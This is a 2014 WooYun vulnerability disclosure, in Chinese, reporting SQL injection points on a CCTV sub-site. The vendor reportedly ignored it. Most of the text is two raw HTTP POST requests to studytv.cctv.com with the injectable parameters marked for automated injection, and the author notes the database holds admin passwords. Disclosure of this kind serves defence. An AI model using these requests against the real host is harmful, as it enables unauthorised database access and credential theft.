wybug_title: 中央电视台cctv某分站SQL注入合集
wybug_status: 漏洞已经通知厂商但是厂商忽略漏洞
wybug_detail:
漏洞详情 披露状态：   									2014-11-26：	细节已通知厂商并且等待厂商处理中									2014-12-01：	厂商已经主动忽略漏洞，细节向公众公开  简要描述： 央视网某分站sql注入合集，友情帮测~ 详细说明：  首先是之前的一个洞还没补，现在仍然能注
 WooYun: CCTV某分站sql注射 
然后又测了下，发现还有两处注入第一处
POST /activity/getnewsbypubusername HTTP/1.1Content-Length: 67Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://studytv.cctv.com:80/Host: studytv.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*PubUserName=*&strNum=1
第二处
POST /tv/getschedule HTTP/1.1Content-Length: 103Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://studytv.cctv.com:80/Host: studytv.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Grade=0&strDate=2014-11-25&strKeyWord=*&strNum=0&Subject=0
之前没补的那个洞也介绍了库中数据量很大，还有部分管理账号密码，危害较大   漏洞证明：  第一处
POST /activity/getnewsbypubusername HTTP/1.1Content-Length: 67Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://studytv.cctv.com:80/Host: studytv.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*PubUserName=*&strNum=1


第二处
POST /tv/getschedule HTTP/1.1Content-Length: 103Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://studytv.cctv.com:80/Host: studytv.cctv.comConnection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.63 Safari/537.36Accept: */*Grade=0&strDate=2014-11-25&strKeyWord=*&strNum=0&Subject=0


   修复方案：  过滤   版权声明：转载请注明来源 fall@乌云
